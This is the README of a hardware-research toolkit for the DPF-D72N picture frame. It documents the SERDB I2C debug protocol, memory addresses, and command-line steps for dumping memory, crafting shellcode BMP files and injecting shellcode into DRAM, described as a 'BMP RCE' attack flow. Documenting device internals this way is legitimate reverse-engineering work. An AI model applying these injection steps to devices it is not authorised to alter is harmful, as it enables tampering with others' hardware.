# D72N Tools

Python tools for the DPF-D72N digital picture frame.

All addresses traced from D72N 8051 overlay blocks and AEON analysis.
SERDB/ISP protocols **CONFIRMED** via firmware trace (see `docs/D72N_INTERFACE_STATUS.md`).

## Platform Support

| Platform | BMP Generator | SERDB/I2C Access |
|----------|---------------|------------------|
| Windows  | ✅ No deps    | ✅ via FTDI adapter |
| macOS    | ✅ No deps    | ✅ via FTDI adapter |
| Linux    | ✅ No deps    | ✅ native /dev/i2c-* |

## Requirements

```bash
# BMP PoC generator - NO DEPENDENCIES (pure Python 3)
python d72n_poc_bmp.py -o exploit.bmp

# For SERDB access:
# Linux (native I2C)
pip install smbus2

# Windows/macOS (FTDI FT232H adapter)
pip install pyftdi
```

## Windows Setup (FTDI Adapter)

1. Get an FT232H or FT2232H USB breakout board (~$15-20)
2. Install Zadig and replace driver with libusbK
3. Wire: SDA→AD1, SCL→AD0, GND→GND (3.3V logic!)
4. `pip install pyftdi`
5. `python d72n_serdb.py ftdi://ftdi:232h/1 --probe`

## SERDB Protocol

The SERDB (SERial DeBug) interface exposes internal chip busses via I2C.

### I2C Address
- **0x59** (standard MStar)

### Commands
| Cmd | Name | Description |
|-----|------|-------------|
| 0x10 | BUS_ACCESS | Bus access with 4-byte address (big endian) |
| 0x34 | DISABLE_ACCESS | Disable bus access |
| 0x35 | ENABLE_ACCESS | Enable bus access |
| 0x36 | RESUME_MCU | Resume MCU |
| 0x37 | STOP_MCU | Stop MCU |
| 0x45 | EXIT | Exit SERDB (NAKed) |
| 0x51 | BEFORE_STOP | Sent before stopping MCU |
| 0x53 | NOT_STOPPING | Sent when not stopping MCU |
| 0x71 | I2C_RESHAPE | I2C reshape |

### Channel Selection (via bit commands)
| Cmd | Function |
|-----|----------|
| 0x80/0x81 | Channel bit 0 clear/set |
| 0x82/0x83 | Channel bit 1 clear/set |
| 0x84/0x85 | Channel bit 2 clear/set |

### Channels
| Ch | Bus |
|----|-----|
| 0 | 8051 XDATA |
| 3 | PM RIU |
| 4 | Non-PM RIU |

### Initialization Sequence
1. Write magic string "SERDB"
2. Set channel bits (0x80-0x85)
3. Send init: 0x53, 0x7F, 0x35, 0x71

### DRAM Access (Older Variant)
For DRAM access via XDMIU:
- Write address bits 16-23 to XDATA 0x0000
- Access low 16 bits directly

Example: To access 0x101FFE, write 0x10 to 0x0000, then access 0x1FFE.

## Tool Overview

| Tool | Purpose | Deps |
|------|---------|------|
| `d72n_bmp_rce.py` | **Full RCE** - BMP=BLUE, screen=RED, arb write | smbus2/pyftdi |
| `d72n_display_test.py` | Direct LCD write test | smbus2/pyftdi |
| `d72n_poc_bmp.py` | BMP PoC generator | None |
| `d72n_serdb.py` | Core SERDB I2C library | smbus2/pyftdi |
| `d72n_dump_xdata.py` | Dump 8051 XDATA memory | smbus2/pyftdi |
| `d72n_dump_dram.py` | Dump shared DRAM memory | smbus2/pyftdi |
| `d72n_state.py` | System state monitor | smbus2/pyftdi |
| `d72n_aeon_control.py` | AEON processor control | smbus2/pyftdi |
| `d72n_watchdog.py` | Watchdog timer control | smbus2/pyftdi |
| `d72n_mailbox.py` | Mailbox IPC protocol | smbus2/pyftdi |
| `d72n_exploit_bmp.py` | BMP exploit generator | None |
| `d72n_shellcode_inject.py` | Shellcode injection | smbus2/pyftdi |

## Quick Start - BMP RCE (BMP=BLUE, Screen=RED)

```bash
# Generate decoy BMP (solid BLUE)
python d72n_bmp_rce.py --generate-decoy -o decoy.bmp

# Copy decoy.bmp to SD card, insert into D72N

# Connect SERDB and run RCE
python d72n_bmp_rce.py /dev/i2c-1 --exploit

# View decoy.bmp on D72N -> Display shows RED, not BLUE!
```

Uses MB_BMP_CMD_DECODE_MEM_OUT (AEON 0x4CFFC). Arbitrary write to 0x150000.

## Quick Start - Direct Display Write

```bash
# Fill screen with RED via SERDB
python d72n_display_test.py /dev/i2c-1 --red-screen

# Draw "PWNED" text on screen
python d72n_display_test.py /dev/i2c-1 --marker "PWNED"
```

Writes directly to **display buffer 0x150000** (384 refs in AEON).
Changes appear **IMMEDIATELY** on the LCD panel.

## Quick Start - SERDB Access

```bash
# Linux
python d72n_serdb.py /dev/i2c-1 --probe

# Windows/macOS (FTDI adapter)
python d72n_serdb.py ftdi://ftdi:232h/1 --probe

# Simulation (no hardware)
python d72n_serdb.py sim:// --probe

# Stop MCU for safe access
python d72n_serdb.py /dev/i2c-1 --stop-mcu

# Dump DRAM to verify BMP write
python d72n_serdb.py /dev/i2c-1 --dump-dram 0x100000 64

# Resume MCU
python d72n_serdb.py /dev/i2c-1 --resume-mcu
```

## Memory Dumping

```bash
# Dump mailbox region
python3 d72n_dump_xdata.py /dev/i2c-1 --range 0x4000 0x500

# Dump main DRAM buffer (limited)
python3 d72n_dump_dram.py /dev/i2c-1 --buffer main --limit 0x1000

# Search for pattern in DRAM
python3 d72n_dump_dram.py /dev/i2c-1 --search DEADBEEF
```

## Exploitation

```bash
# Create shellcode BMP
python3 d72n_exploit_bmp.py --shellcode payload.bin -o exploit.bmp

# Create test pattern BMP
python3 d72n_exploit_bmp.py --pattern DEADBEEF --size 100x100 -o test.bmp

# Inject test pattern to DRAM buffer
python3 d72n_shellcode_inject.py /dev/i2c-1 --test-pattern

# Inject custom shellcode
python3 d72n_shellcode_inject.py /dev/i2c-1 --shellcode payload.bin --target 0x100000
```

## Key Addresses (Traced)

### Mailbox (Block 02: 0x2830)
- Command: `0x4401`
- Params: `0x4402+`
- Sync: `0x4417`
- Status: `0x40FB`
- Response: `0x40FC-0x40FF`

### AEON Control (Block 01: 0x3CDF)
- Register: `0x0FE6`
- RUN bit: `0x01`
- ENABLE bit: `0x02`

### Watchdog (Blocks 15, 16)
- State: `0x44CE`
- Counter: `0x44D3-0x44D4`

### DRAM Buffers (AEON Analysis)
- Main: `0x100000` (888 refs)
- Secondary: `0x0C0000` (673 refs)
- Output: `0x150000` (384 refs)

## BMP RCE Attack Flow

1. Create malicious BMP with shellcode in pixel data:
   ```bash
   python3 d72n_exploit_bmp.py --shellcode sc.bin -o exploit.bmp
   ```

2. Place on SD card, start slideshow

3. Via SERDB, configure decode target:
   ```bash
   python3 d72n_shellcode_inject.py /dev/i2c-1 --bmp-inject exploit.bmp --target 0x100000
   ```

4. When BMP displays, shellcode written to target DRAM

See `D72N_BMP_DISPLAY_PIPELINE.md` for detailed analysis.

## References

- [linux-chenxing.org SERDB](https://linux-chenxing.org/msc313e/ip/serdb/) - SERDB protocol documentation
- [D72N_INDEX.md](../docs/D72N_INDEX.md) - D72N documentation index
- [D72N_SERDB_CONTROL.md](../docs/D72N_SERDB_CONTROL.md) - SERDB traced addresses
- [D72N_MAILBOX_PROTOCOL.md](../docs/D72N_MAILBOX_PROTOCOL.md) - Mailbox IPC
- [D72N_BMP_DISPLAY_PIPELINE.md](../docs/D72N_BMP_DISPLAY_PIPELINE.md) - BMP RCE analysis
